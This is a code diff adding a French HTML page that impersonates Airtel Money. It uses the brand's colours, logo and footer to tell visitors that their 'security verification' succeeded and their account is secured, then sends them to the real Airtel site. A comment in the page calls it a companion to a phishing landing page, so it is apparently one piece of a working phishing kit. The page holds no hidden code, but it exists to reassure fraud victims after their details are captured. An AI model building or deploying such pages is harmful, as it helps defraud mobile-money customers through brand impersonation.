@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Airtel Money : Vérification Réussie</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            background-color: #f3f4f6; /* bg-gray-100 */
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 1rem;
+        }
+        .airtel-red-500 {
+            background-color: #E4002B; /* Rouge vif Airtel */
+        }
+        .airtel-red-600 {
+            background-color: #B00021; /* Rouge plus foncé pour les interactions (hover) */
+        }
+        .airtel-text-red-500 {
+            color: #E4002B; /* Couleur du texte rouge Airtel */
+        }
+        /* Styles génériques pour les éléments interactifs au focus */
+        input:focus, button:focus, select:focus, a:focus {
+            outline: none !important;
+            border-color: #E4002B !important; /* Couleur de bordure Airtel au focus */
+            box-shadow: 0 0 0 3px rgba(228, 0, 43, 0.4) !important; /* Ombre de focus Airtel */
+        }
+
+        /* Effet de brillance subtile sur les boutons */
+        .shine-effect {
+            position: relative;
+            overflow: hidden;
+            z-index: 1; /* Assure que le pseudo-élément est au-dessus */
+        }
+        .shine-effect::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -60%;
+            width: 30%;
+            height: 200%;
+            background: rgba(255, 255, 255, 0.15);
+            transform: rotate(30deg);
+            transition: all 0.5s ease-in-out;
+            opacity: 0;
+            z-index: -1; /* Place le pseudo-élément derrière le texte */
+        }
+        .shine-effect:hover::after {
+            left: 100%;
+            opacity: 1;
+        }
+    </style>
+</head>
+<body class="bg-gray-100">
+    <div class="bg-white rounded-xl shadow-2xl p-6 sm:p-8 md:p-10 w-11/12 max-w-xl border-t-8 border-airtel-red-500 text-center mx-auto transform transition duration-500 hover:scale-[1.01]">
+        <!-- En-tête de la page -->
+        <div class="flex flex-col items-center mb-8">
+            <img src="images/airtel.jpg" alt="Logo Airtel" class="h-28 sm:h-32 mx-auto mb-6 drop-shadow-md transform hover:scale-105 transition duration-300 ease-in-out" onerror="this.onerror=null;this.src='https://placehold.co/280x112/E4002B/FFFFFF?text=AIRTEL';">
+            <h1 class="text-4xl sm:text-5xl font-extrabold airtel-text-red-500 mb-2">Vérification Réussie !</h1>
+            <h2 class="text-xl sm:text-2xl font-bold airtel-text-red-500 mb-4">Votre Compte Airtel Money est Sécurisé</h2>
+        </div>
+
+        <!-- Message de succès -->
+        <p class="text-gray-800 mb-6 text-lg leading-relaxed">
+            <i class="fas fa-check-circle airtel-text-red-500 text-3xl mr-2"></i> Merci d'avoir complété la vérification de sécurité de votre compte Airtel Money. Vos informations ont été confirmées avec succès.
+        </p>
+        <p class="text-gray-700 mb-8 text-base sm:text-lg">
+            Votre accès aux services Airtel Money est maintenant entièrement rétabli et sécurisé.
+        </p>
+
+        <!-- Bouton de retour ou d'action -->
+        <a href="https://www.airtel.cd" class="inline-block airtel-red-500 text-white font-bold py-3 px-6 rounded-lg text-lg hover:airtel-red-600 transition duration-300 shadow-lg transform hover:scale-105 shine-effect">
+            <i class="fas fa-home mr-2"></i> Retourner à l'Accueil Airtel
+        </a>
+
+        <p class="text-sm text-gray-600 mt-8 text-center">
+            Pour toute assistance supplémentaire, veuillez contacter le service client Airtel Money.
+        </p>
+    </div>
+
+    <!-- Pied de page, similaire à la page d'accueil de phishing -->
+    <footer class="w-full max-w-2xl text-center text-gray-500 text-xs mt-8 px-4 sm:px-0 mx-auto">
+        <p>&copy; 2025 Airtel Money. Tous droits réservés.</p>
+        <p class="mt-1">
+            <a href="#" class="hover:underline mx-2">Conditions Générales</a> |
+            <a href="#" class="hover:underline mx-2">Politique de Confidentialité</a> |
+            <a href="#" class="hover:underline mx-2">FAQ</a>
+        </p>
+        <p class="mt-1">
+            Airtel Money - Un service fiable et sécurisé.
+        </p>
+    </footer>
+</body>
+</html>
